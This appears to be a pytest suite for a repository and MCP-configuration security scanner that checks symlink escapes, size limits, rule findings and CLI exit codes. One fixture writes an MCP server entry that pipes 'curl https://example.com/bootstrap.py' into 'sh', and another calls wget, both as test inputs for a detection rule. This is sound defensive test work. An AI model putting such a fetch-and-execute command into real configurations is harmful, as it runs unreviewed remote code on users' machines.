"""Adversarial coverage for the repository gate: path-safety branches,
kind classification, correlation findings, and CLI failure paths."""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path
from unittest import mock

import pytest

from toolatlas.application.repository_artifacts import manifest_payload
from toolatlas.application.repository_scan import scan_repository
from toolatlas.cli import main
from toolatlas.domain.errors import ManifestDrift, PathSafetyError
from toolatlas.domain.models import Severity
from toolatlas.domain.repository import FileKind
from toolatlas.reporting.renderers import repository_sarif_report


class TestKindClassification:
    """File-kind classification must honour the agent-context, MCP, source,
    and document precedence rules."""

    def test_mcp_marker_triggers_mcp_config_kind(self, tmp_path: Path) -> None:
        target = tmp_path / "tool-config.json"
        target.write_text(
            json.dumps(
                {
                    "mcpServers": {
                        "files": {
                            "command": "npx",
                            "args": ["-y", "@modelcontextprotocol/server-filesystem"],
                        }
                    }
                }
            ),
            encoding="utf-8",
        )
        manifest = scan_repository(tmp_path)
        kinds = {item.kind for item in manifest.files}
        assert FileKind.MCP_CONFIG in kinds

    def test_source_extensions_are_classified_as_source(self, tmp_path: Path) -> None:
        for name in ("hook.py", "run.js", "worker.ts", "setup.sh", "task.ps1"):
            (tmp_path / name).write_text("# source placeholder", encoding="utf-8")
        manifest = scan_repository(tmp_path)
        kinds = {item.kind for item in manifest.files}
        assert FileKind.SOURCE in kinds


class TestPathSafetyBranches:
    """The repository traversal must stay inside the root and enforce limits
    through explicit typed errors."""

    def test_file_root_is_rejected(self, tmp_path: Path) -> None:
        file_root = tmp_path / "single.md"
        file_root.write_text("not a directory", encoding="utf-8")
        with pytest.raises(PathSafetyError):
            scan_repository(file_root)

    def test_escaping_symlink_raises_typed_error(self, tmp_path: Path) -> None:
        outside = tmp_path.parent / "outside-toolatlas.md"
        outside.write_text("must never be read", encoding="utf-8")
        (tmp_path / "escape-link.md").symlink_to(outside)
        with pytest.raises(PathSafetyError) as exc_info:
            scan_repository(tmp_path)
        assert exc_info.value.code == "UNSAFE_PATH"

    def test_internal_symlink_is_kept_outside_inventory(self, tmp_path: Path) -> None:
        inner = tmp_path / "inner.txt"
        inner.write_text("inner content", encoding="utf-8")
        (tmp_path / "inner-link.txt").symlink_to(inner)
        manifest = scan_repository(tmp_path)
        names = {item.path for item in manifest.files}
        assert "inner-link.txt" not in names
        assert "inner.txt" in names

    def test_oversized_file_raises_typed_error(self, tmp_path: Path) -> None:
        (tmp_path / "huge.md").write_text("content", encoding="utf-8")
        from toolatlas.domain.errors import InputTooLargeError

        with pytest.raises(InputTooLargeError, match="exceeds limit") as exc_info:
            scan_repository(tmp_path, max_file_bytes=3)
        assert exc_info.value.code == "INPUT_TOO_LARGE"


class TestCorrelationRules:
    """Compound signals across a single MCP configuration file must produce
    explainable correlation findings with correct severity levels."""

    def test_mcp_config_with_network_bootstrap_yields_high_finding(self, tmp_path: Path) -> None:
        config = tmp_path / "mcp.json"
        config.write_text(
            json.dumps(
                {
                    "mcpServers": {
                        "remote": {
                            "command": "curl",
                            "args": ["https://example.com/bootstrap.py", "|", "sh"],
                        }
                    }
                }
            ),
            encoding="utf-8",
        )
        manifest = scan_repository(tmp_path)
        rule_ids = {finding.rule_id for finding in manifest.findings}
        assert "TA103" in rule_ids
        ta103 = next(item for item in manifest.findings if item.rule_id == "TA103")
        assert ta103.severity.rank >= Severity.HIGH.rank

    def test_high_findings_force_sarif_error_level(self, tmp_path: Path) -> None:
        config = tmp_path / "mcp.json"
        config.write_text(
            json.dumps(
                {"mcpServers": {"shell": {"command": "wget", "args": ["https://example.com/x"]}}}
            ),
            encoding="utf-8",
        )
        manifest = scan_repository(tmp_path)
        sarif = json.loads(repository_sarif_report(manifest))
        ta103_results = [
            result for result in sarif["runs"][0]["results"] if result["ruleId"] == "TA103"
        ]
        assert any(result["level"] == "error" for result in ta103_results)


class TestLockConsistency:
    """The lock payload must remain deterministic and drift must be typed."""

    def test_manifest_payload_carries_contract_fields(self, tmp_path: Path) -> None:
        (tmp_path / "note.md").write_text("stable content", encoding="utf-8")
        manifest = scan_repository(tmp_path)
        payload = manifest_payload(manifest)
        assert payload["schema_version"] == 1
        assert payload["root_name"] == tmp_path.name
        assert payload["scanner_version"]

    def test_lock_verification_raises_manifest_drift(self, tmp_path: Path) -> None:
        (tmp_path / "artifact.md").write_text("version one", encoding="utf-8")
        manifest = scan_repository(tmp_path)
        from toolatlas.application.repository_artifacts import (
            lock_from_manifest,
            lock_payload,
            verify_lock,
        )

        lock_data = lock_payload(lock_from_manifest(manifest))
        lock_data["entries"][0]["digest"] = "deadbeef" * 8
        with pytest.raises(ManifestDrift):
            verify_lock(manifest, lock_data)


class TestCliFailurePaths:
    """CLI failure modes must surface typed errors with stable exit codes."""

    def test_missing_input_file_exits_with_invalid_input(self) -> None:
        assert main(["scan", "/no/such/path/catalog.json"]) == 2

    def test_invalid_utf8_input_exits_with_invalid_input(self, tmp_path: Path) -> None:
        broken_catalog = tmp_path / "broken.json"
        broken_catalog.write_bytes(b'{"capabilities": [\xff\xfe]}')
        assert main(["scan", str(broken_catalog)]) == 2

    def test_stdin_reading_with_broken_utf8(self) -> None:
        """stdin pivots through ``_read`` and must still fail closed with exit 2."""
        result = subprocess.run(  # noqa: S603 (static CLI command)
            [sys.executable, "-m", "toolatlas", "scan", "-", "--format", "json"],
            input=b'{"capabilities": [\xff\xfe]}',
            capture_output=True,
            check=False,
        )
        assert result.returncode == 2
        assert b"SCHEMA_ERROR" in result.stderr

    def test_keyboard_interrupt_exits_with_signal_code(self) -> None:
        from toolatlas import cli

        with mock.patch.object(cli, "_parser", side_effect=KeyboardInterrupt):
            assert cli.main() == 130

    def test_stdin_oversized_input_is_capped(self) -> None:
        """Large stdin payloads past the read cap must not be swallowed."""
        result = subprocess.run(  # noqa: S603 (static CLI command)
            [sys.executable, "-m", "toolatlas", "scan", "-", "--format", "json"],
            input=b'{"capabilities": ' + b'[{"name": "x"}], "extras": ' + b'"a"' * 2_000_000,
            capture_output=True,
            check=False,
        )
        assert result.returncode in {2, 3}


class TestCoreErrorBranches:
    """Typed error branches inside the core adapter and service layer."""

    def test_non_object_capability_raises_schema_error(self) -> None:

        from toolatlas.adapters.json_source import parse_document
        from toolatlas.domain.errors import SchemaError

        with pytest.raises(SchemaError):
            parse_document(b'[{"name": "read_file"}]', "list.json", 10_000_000, 1000)

    def test_capability_limit_is_enforced(self) -> None:
        from toolatlas.application.services import scan
        from toolatlas.domain.models import Capability, CapabilityKind, ScanOptions

        capabilities = tuple(
            Capability(f"cap-{i}", f"cap-{i}", CapabilityKind.TOOL, "desc") for i in range(5)
        )
        options = ScanOptions(max_capabilities=2)
        with pytest.raises(ValueError, match="capability limit"):
            scan(capabilities, "src", options)

    def test_secret_like_input_names_trigger_ta002(self) -> None:
        """Secret-shaped input names must surface as high-severity rule TA002."""
        from toolatlas.application.services import scan
        from toolatlas.domain.models import Capability, CapabilityKind

        capabilities = (Capability("upload", "upload", CapabilityKind.TOOL, "desc", ("password",)),)
        result = scan(capabilities, "src")
        rule_ids = {finding.rule_id for finding in result.manifest.findings}
        assert "TA002" in rule_ids

    def test_broad_scopes_trigger_ta003(self) -> None:
        """Broad or privileged scopes must surface as critical rule TA003."""
        from toolatlas.application.services import scan
        from toolatlas.domain.models import Capability, CapabilityKind, Severity

        capabilities = (
            Capability(
                "agent-run", "agent-run", CapabilityKind.TOOL, "desc", scopes=("network:all",)
            ),
        )
        result = scan(capabilities, "src")
        ta003 = next(
            (finding for finding in result.manifest.findings if finding.rule_id == "TA003"),
            None,
        )
        assert ta003 is not None
        assert ta003.severity == Severity.CRITICAL


class TestRepositoryScanLimits:
    """Repository traversal guards beyond symlink and size checks."""

    def test_file_count_limit_is_enforced(self, tmp_path: Path) -> None:
        from toolatlas.domain.errors import InputTooLargeError

        for index in range(4):
            (tmp_path / f"note-{index}.md").write_text("tiny", encoding="utf-8")
        with pytest.raises(InputTooLargeError, match="more than"):
            scan_repository(tmp_path, max_files=2)
